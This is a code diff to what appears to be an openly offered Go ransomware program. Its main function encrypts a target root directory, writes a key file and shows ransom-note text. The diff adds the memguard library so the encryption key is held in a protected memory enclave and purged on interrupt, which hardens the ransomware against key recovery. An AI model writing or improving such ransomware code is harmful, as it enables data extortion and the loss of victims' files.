@@ -8,6 +8,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/awnumar/memguard"
 	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/ransomware"
 	"golang.org/x/exp/errors/fmt"
@@ -24,10 +25,16 @@ Place the correct key.txt into the decrypted root folder.
 `
 
 func main() {
+	// safely terminate in case of an interrupt signal
+	memguard.CatchInterrupt()
+	defer memguard.Purge()
+
 	rw, err := ransomware.NewRansomware(rootToEncrypt)
 	if err != nil {
 		log.Fatalf("error creating a ransomware instance: %s", err)
 	}
+
+	rw.MemguardKey = memguard.NewEnclave(rw.Key)
 
 	crypt.EncryptRoot(rw.RootDir, rw.Key)
 	if err := rw.WriteKeyFile(); err != nil {
